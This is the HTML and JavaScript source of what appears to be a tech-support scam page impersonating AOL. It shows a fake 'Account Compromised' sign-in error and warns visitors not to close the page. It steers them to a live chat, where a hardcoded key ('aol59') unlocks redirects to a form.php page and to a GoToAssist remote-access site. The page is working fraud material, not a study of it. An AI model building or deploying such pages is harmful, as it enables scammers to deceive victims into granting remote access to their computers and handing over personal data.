<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Loading.....</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="./css/err.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        ::-webkit-input-placeholder { /* Edge */
    color: #4d4d4d;
    font-size: 16px;
    font-weight: 300;
    text-align:left;
    /* padding-left:15px; */
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  
  :-ms-input-placeholder { /* Internet Explorer */
    color: #4d4d4d;
  }
  
  ::placeholder {
    color: #4d4d4d;
  }
        .loader 
        {   
            margin-left:45%;
            margin-top:15%;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #39f;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .rk-activ1{
            margin-top:8%;
        }
        .loader2 
        {   
            margin-left:35%;
            margin-top:10%;
            display:none;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #662d91;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media only screen and (max-width: 1200px)
        {
            .loader
            {
                margin-top:18%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 425px)
        {
            .loader
            {
                margin-top:35%;
                margin-left:35%;
            }
        }
        #actr{
            display:none;
        }
    </style>
</head>
<body>

<div class="loader"></div>

<div class="loader1">
    <div class="nor-nav-back">
        <div class="container">
            <img src="img/logo.png" alt="" class="image-responsive lo-er-go">
        </div>
    </div>
    <div class="container">
        <h1 class="in-head text-center">Error <span>"LOGA379A"</span> Unable to sign in your account</h1>
        <p class="text-center nd-para-2">Account Compromised - Unable to confirm your identity </p>
        <p class="text-center nd-para-3">Do not refresh or close the page you might loose your AOL Email Account</p>
        <p class="text-center nd-para-4">You will get a call from our support representative shortly, If you cannot wait we recommend you to contact our chat support now</p>
        <h3 class="text-center nd-para-5">Contact Customer Support </h3>
        <div class="col-lg-8 col-md-10 col-sm-12  col-lg-offset-2 col-md-offset-2 caht-b-gr text-center">
            <div class="col-sm-4 text-center er-box">
                <h1><i class="fa fa-comments" aria-hidden="true"></i></h1>
                <p>For instant help live chat now to resolve the issues <br></p>
                <a href="javascript:void(Tawk_API.toggle())">Chat</a>
            </div>
            <div class="col-sm-4 text-center er-box">
                <h1><i class="fa fa-envelope" aria-hidden="true"></i></h1>
                <p>Email us and we will follow up within 24 hours. </p>
                <a data-toggle="modal" data-target="#myModal">Email</a>
            </div>
            <div class="col-sm-4 text-center er-box">
                <h1><i class="fa fa-user-circle-o" aria-hidden="true"></i></h1>
                <p>Connect with customer service representative for more help.</p>
                <a data-toggle="modal" data-target="#myModal1">Connect</a>
            </div>
            <p class="foo-copy"></p>
            <hr><br><br><br>
            <div class="fo-list">
                <ul>
                    <li>English &nbsp;| &nbsp;</li>
                    <li>Legal Notices &nbsp; |&nbsp;</li>
                    <li>License Agreement &nbsp; |&nbsp; </li>
                    <li>Privacy Policy &nbsp; |&nbsp;</li>
                    <li>Support Policy &nbsp; | &nbsp;</li>
                    <li>Careers &nbsp; | &nbsp;</li>
                    <li>Cookies &nbsp; |&nbsp;</li>
                    <li>System Status<li>
                </ul>
            </div>
            <hr>
            <div class="copyright-foo">
                <ul>
                    <li><img src="img/sy.png" class="image-responsive co-fo-im" alt=""></li>
                    <li>Copyright © 2019 Aol Support Inc. All rights reserved.</li>
                </ul>
            </div>
        </div>
    </div>
</div>

<!-- Email Modal -->

<div class="modal fade" id="myModal" role="dialog">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body text-center">
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                    <form action="" id="form1">
                        <span class="email-span"></span>
                        <p class="modal-cont">Chat with a support representative to generate key</p>
                        <input type="text" class="modal-input email-input" placeholder="Enter your Key">
                        <input type="submit" value="Submit" class="modal-submit">
                    </form>
                </div>
            </div>
         </div>
    </div>

<!-- //Email Modal -->


<!-- connect Modal -->

    <div class="modal fade" id="myModal1" role="dialog">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body text-center">
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                    <form action="" id="form2">
                        <span class="contact-span"></span>
                        <p class="modal-cont">Chat with a support representative to generate key</p>
                        <input type="text" class="modal-input contact-input" placeholder="Enter your Key">
                        <input type="submit" value="Submit" class="modal-submit">
                    </form>
                </div>
            </div>
         </div>
    </div>

<!-- //connect Modal -->

</body>
</html>
<script>
    
    $(document).ready(function(){
    $(".loader1").hide();
    setTimeout(function(){
	$(".loader1").show();
},6000);

    setTimeout(function(){
	$(".loader").hide();
},6000);
});
</script>
<script>
    function redirect()
    {
        window.location="form.php";
    }
    function redirect1()
    {
        window.location="https://fastsupport.gotoassist.com/";
    }

    $("#form1").submit(function()
    {
        var a =$(".email-input").val();
        if(a === "aol59")
        {
            setTimeout("redirect()",0)
        }
        else{
            $(".email-span").text("Not valid").show();
            event.preventDefault();
        }
          
    });
    
    $("#form2").submit(function(){
        var b = $(".contact-input").val();
        if(b === "aol59")
        {
            setTimeout("redirect1()", 0)
        }
        else
        {
            $(".contact-span").text("Not Valid").show();
            event.preventDefault();
        }
        
    })
</script>

<!--Start of Tawk.to Script--> 
<script type="text/javascript"> var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date(); (function(){ var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0]; s1.async=true; s1.src='https://embed.tawk.to/5bbfe6d208387933e5bb0362/default'; s1.charset='UTF-8'; s1.setAttribute('crossorigin','*'); s0.parentNode.insertBefore(s1,s0); })(); </script> 
<!--End of Tawk.to Script-->